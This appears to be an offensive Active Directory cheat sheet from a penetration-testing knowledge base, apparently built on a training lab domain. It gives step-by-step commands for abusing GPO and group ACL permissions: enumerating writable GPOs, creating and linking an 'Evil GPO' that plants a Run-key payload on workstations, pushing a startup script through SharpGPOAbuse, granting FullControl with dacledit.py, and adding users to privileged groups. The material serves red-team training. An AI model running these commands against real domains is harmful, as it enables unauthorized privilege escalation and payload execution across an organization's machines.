## Creating a new GPO Privilege Escalation [t-ad-acl-acl_gpo_create_new]

Group Policy Objects are stored in CN=Policies,CN=System - principals that can create new GPOs in the domain have the "Create groupPolicyContainer objects" privilege over this object.

### 1.1.1 Enumerate



{% code overflow="wrap" %}
```bash
Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }

#Being able to create a GPO doesn't achieve anything unless it can be linked to an OU.  The ability to link a GPO to an OU is controlled on the OU itself by granting "Write gPLink" privileges.
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl

```
{% endcode %}

### 1.1.2 Let's resolve the GPO name and the SID of the principal.



{% code overflow="wrap" %}
```bash
Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath
```
{% endcode %}

### 1.1.3 Modify the GPO



{% code overflow="wrap" %}
```bash
New-GPO -Name "Evil GPO"  
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\dns_x64.exe" -Type ExpandString
Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"

```
{% endcode %}

## Modifying an existing GPO [t-ad-acl-acl_gpo_modify]

Modifying an existing GPO that is already applied to one or more OUs is the most straightforward scenario. To search for these, we need to enumerate all GPOs in the domain with Get-DomainGPO and check the ACL of each one with Get-DomainObjectAcl. We want to filter any for which a principal has modify privileges such as CreateChild, WriteProperty or GenericWrite, and also want to filter out the legitimate principals including SYSTEM, Domain Admins and Enterprise Admins.

### 1.1.1 Enumerate



{% code overflow="wrap" %}
```bash
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" | select distinguishedName
ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5059FAC1-5E94-4361-95D3-3BB235A23928}

```
{% endcode %}

### 1.1.2 Resolve the GPO name and the SID of the principal.



{% code overflow="wrap" %}
```bash
Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath
```
{% endcode %}

### 1.1.3 Modify the GPO



{% code overflow="wrap" %}
```bash
SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\dc-2\software\dns_x64.exe" --GPOName "Vulnerable GPO"

```
{% endcode %}

## Owns Permissions (WriteDACL + WriteOwner) Exploitation on Groups [t-ad-acl-acl_groups_owns]

### Overview

Owns Permissions (WriteDACL + WriteOwner) allows to add GerericAll permission, then it can be used to add users to the group.


### References:

* [https://habr.com/ru/companies/solarsecurity/articles/681108/](https://habr.com/ru/companies/solarsecurity/articles/681108/)

* [https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse)

### 1.1.1 Modify ACL on the group (add GenericAll permissions)



{% code overflow="wrap" %}
```bash
python3 examples/dacledit.py -action write -rights FullControl -k -principal <username> -target "<groupname>" -dc-ip <dc-ip>  domain.com/username@dc.domain.com -debug
```
{% endcode %}

### 1.1.2 Add a user to the group




**option 1: net user**

{% code overflow="wrap" %}
```bash
net user <username> <password> /domain
```
{% endcode %}


**option 2: powerview**

{% code overflow="wrap" %}
```bash
Add-DomainGroupMember -Identity "<GroupName>" -Members username -Verbose
```
{% endcode %}


**option 3: net rpc (linux)**

{% code overflow="wrap" %}
```bash
net rpc group addmem "domain.com\group name" <username> -U 'domain.com\username' -S dc.domain.com
```
{% endcode %}

{% hint style="info" %}--use-kerberos=required can be added for kerberos

{% endhint %}

